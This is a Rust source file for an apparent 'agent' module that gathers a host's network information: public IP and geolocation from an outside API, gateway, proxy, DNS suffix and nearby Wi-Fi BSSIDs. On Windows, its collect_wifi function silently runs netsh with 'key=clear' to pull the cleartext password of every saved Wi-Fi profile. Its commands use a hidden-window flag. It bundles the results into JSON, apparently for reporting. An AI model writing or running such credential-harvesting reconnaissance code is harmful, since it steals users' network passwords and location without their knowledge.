use std::sync::Mutex;

static GEO_CACHE: Mutex<Option<String>> = Mutex::new(None);

pub struct NetworkInfo;

impl NetworkInfo {
    /// Fetch geo info once and cache. Call at agent startup.
    pub async fn warmup_geo() -> Option<String> {
        {
            let cache = GEO_CACHE.lock().unwrap();
            if let Some(ref cached) = *cache {
                return Some(cached.clone());
            }
        }

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(5))
            .build()
            .ok()?;

        let resp = client
            .get("https://uapis.cn/api/v1/network/myip")
            .send()
            .await
            .ok()?;

        let text = resp.text().await.ok()?;

        let mut cache = GEO_CACHE.lock().unwrap();
        *cache = Some(text.clone());
        Some(text)
    }

    /// Collect full network information.
    pub async fn collect() -> String {
        let wan = Self::collect_wan().await;
        let wifi = Self::collect_wifi();
        let nearby_wifi = Self::collect_wifi_bssid();
        let proxy = Self::collect_proxy();
        let dns_suffix = Self::get_dns_suffix();

        format!(
            r#"{{"interfaces":[],"wan":{},"wifi":{},"nearbyWifi":{},"proxy":{},"dnsSuffix":"{}"}}"#,
            wan, wifi, nearby_wifi, proxy, escape(&dns_suffix)
        )
    }

    async fn collect_wan() -> String {
        let gateway = Self::get_default_gateway();

        // Try cached geo data
        let cached = GEO_CACHE.lock().unwrap().clone();
        if let Some(ref geo) = cached {
            let ip = extract_str(geo, "ip").unwrap_or("unavailable");
            let region = extract_str(geo, "region").unwrap_or("").trim().to_string();
            let isp = extract_str(geo, "isp").unwrap_or("");
            let asn = extract_str(geo, "asn").unwrap_or("");
            let llc = extract_str(geo, "llc").unwrap_or("");
            let lat = extract_num(geo, "latitude");
            let lng = extract_num(geo, "longitude");

            return format!(
                r#"{{"publicIp":"{}","gateway":"{}","region":"{}","isp":"{}","asn":"{}","llc":"{}","latitude":{},"longitude":{}}}"#,
                escape(ip),
                escape(&gateway.unwrap_or_else(|| "unknown".into())),
                escape(&region),
                escape(isp),
                escape(asn),
                escape(llc),
                lat,
                lng
            );
        }

        format!(
            r#"{{"publicIp":"{}","gateway":"{}","region":"","isp":"","asn":"","llc":"","latitude":0,"longitude":0}}"#,
            escape("unavailable"),
            escape(&gateway.unwrap_or_else(|| "unknown".into()))
        )
    }

    fn get_default_gateway() -> Option<String> {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            let output = std::process::Command::new("wmic")
                .args(["path", "Win32_NetworkAdapterConfiguration", "where", "IPEnabled=TRUE", "get", "DefaultIPGateway", "/format:csv"])
                .creation_flags(0x08000000)
                .output()
                .ok()?;
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines().skip(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let gw = parts[1].trim();
                    if !gw.is_empty() && gw != "0.0.0.0" {
                        // May contain multiple gateways, take first
                        let first = gw.split(';').next().unwrap_or("").trim();
                        if !first.is_empty() {
                            return Some(first.to_string());
                        }
                    }
                }
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let output = std::process::Command::new("ip")
                .args(["route", "show", "default"])
                .output()
                .ok()?;
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                if line.contains("default") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        return Some(parts[2].to_string());
                    }
                }
            }
        }
        None
    }

    fn collect_wifi() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            // Get profiles
            let profiles_output = std::process::Command::new("netsh")
                .args(["wlan", "show", "profiles"])
                .creation_flags(0x08000000)
                .output()
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            let mut profile_names = Vec::new();
            for line in profiles_output.lines() {
                let trimmed = line.trim();
                if trimmed.starts_with(": ") {
                    profile_names.push(trimmed[2..].trim().to_string());
                } else if trimmed.contains(":") {
                    let parts: Vec<&str> = trimmed.splitn(2, ':').collect();
                    if parts.len() == 2 && parts[0].trim().eq_ignore_ascii_case("All User Profile") {
                        profile_names.push(parts[1].trim().to_string());
                    }
                }
            }

            let mut profiles = Vec::new();
            for name in &profile_names {
                if let Ok(output) = std::process::Command::new("netsh")
                    .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
                    .creation_flags(0x08000000)
                    .output()
                {
                    let detail = String::from_utf8_lossy(&output.stdout);
                    let mut password = "";
                    for line in detail.lines() {
                        let t = line.trim();
                        if t.contains("Key Content") && t.contains(":") {
                            password = t.splitn(2, ':').nth(1).unwrap_or("").trim();
                            break;
                        }
                    }
                    profiles.push(format!(
                        r#"{{"ssid":"{}","password":"{}"}}"#,
                        escape(name), escape(password)
                    ));
                }
            }
            return format!("[{}]", profiles.join(","));
        }
        #[cfg(not(target_os = "windows"))]
        "[]".to_string()
    }

    fn collect_wifi_bssid() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            let output = std::process::Command::new("netsh")
                .args(["wlan", "show", "networks", "mode=bssid"])
                .creation_flags(0x08000000)
                .output()
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            let sections: Vec<&str> = output.split("SSID ").collect();
            let mut networks = Vec::new();

            for section in sections.iter().skip(1) {
                let lines: Vec<&str> = section.lines().collect();
                if lines.is_empty() { continue; }
                let colon_idx = match lines[0].find(':') {
                    Some(i) => i,
                    None => continue,
                };
                let ssid = lines[0][colon_idx + 1..].trim();
                if ssid.is_empty() { continue; }

                let mut auth = "";
                let mut encryption = "";
                let mut current_bssid = "";
                for line in &lines {
                    let t = line.trim();
                    if t.to_lowercase().starts_with("authentication") {
                        auth = extract_after_colon(t);
                    } else if t.to_lowercase().starts_with("encryption") {
                        encryption = extract_after_colon(t);
                    } else if t.to_uppercase().starts_with("BSSID") {
                        current_bssid = extract_after_colon(t);
                    } else if t.to_lowercase().starts_with("signal") {
                        let signal = extract_after_colon(t).replace("%", "").trim().to_string();
                        networks.push(format!(
                            r#"{{"ssid":"{}","auth":"{}","encryption":"{}","bssid":"{}","signal":"{}"}}"#,
                            escape(ssid), escape(auth), escape(encryption), escape(current_bssid), escape(&signal)
                        ));
                    }
                }
            }
            return format!("[{}]", networks.join(","));
        }
        #[cfg(not(target_os = "windows"))]
        "[]".to_string()
    }

    fn collect_proxy() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            if let Ok(output) = std::process::Command::new("reg")
                .args(["query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"])
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout).to_uppercase();
                let enabled = text.contains("PROXYENABLE") && text.contains("0X1");
                let server = {
                    let search = "PROXYSERVER";
                    if let Some(pos) = text.find(search) {
                        let rest = &text[pos + search.len()..];
                        if let Some(reg_pos) = rest.find("REG_SZ") {
                            rest[reg_pos + 6..].lines().next().unwrap_or("").trim().to_string()
                        } else {
                            String::new()
                        }
                    } else {
                        String::new()
                    }
                };

                let port: u16 = if let Some(colon) = server.rfind(':') {
                    server[colon + 1..].parse().unwrap_or(0)
                } else { 0 };

                return format!(
                    r#"{{"enabled":{},"server":"{}","port":{},"bypass":""}}"#,
                    enabled, escape(&server), port
                );
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let http_proxy = std::env::var("HTTP_PROXY")
                .or_else(|_| std::env::var("http_proxy"))
                .unwrap_or_default();
            let https_proxy = std::env::var("HTTPS_PROXY")
                .or_else(|_| std::env::var("https_proxy"))
                .unwrap_or_default();
            let all_proxy = if !https_proxy.is_empty() { &https_proxy } else { &http_proxy };
            let enabled = !all_proxy.is_empty();

            return format!(
                r#"{{"enabled":{},"server":"{}","port":0,"bypass":""}}"#,
                enabled, escape(all_proxy)
            );
        }
        r#"{"enabled":false,"server":"","port":0,"bypass":""}"#.to_string()
    }

    fn get_dns_suffix() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            if let Ok(output) = std::process::Command::new("ipconfig")
                .args(["/all"])
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    if line.contains("DNS Suffix") && line.contains(":") {
                        return line.split(':').nth(1).unwrap_or("").trim().to_string();
                    }
                }
            }
        }
        String::new()
    }
}

fn extract_str<'a>(json: &'a str, key: &str) -> Option<&'a str> {
    let search = format!("\"{}\":\"", key);
    let start = json.find(&search)?;
    let start = start + search.len();
    let end = json[start..].find('"')?;
    Some(&json[start..start + end])
}

fn extract_num(json: &str, key: &str) -> String {
    let search = format!("\"{}\":", key);
    let start = match json.find(&search) {
        Some(s) => s + search.len(),
        None => return "0".into(),
    };
    let rest = &json[start..];
    let end = rest.find(|c: char| !c.is_ascii_digit() && c != '.' && c != '-').unwrap_or(rest.len());
    if end > 0 { rest[..end].to_string() } else { "0".into() }
}

fn extract_after_colon(s: &str) -> &str {
    s.find(':').map(|i| s[i + 1..].trim()).unwrap_or("")
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}
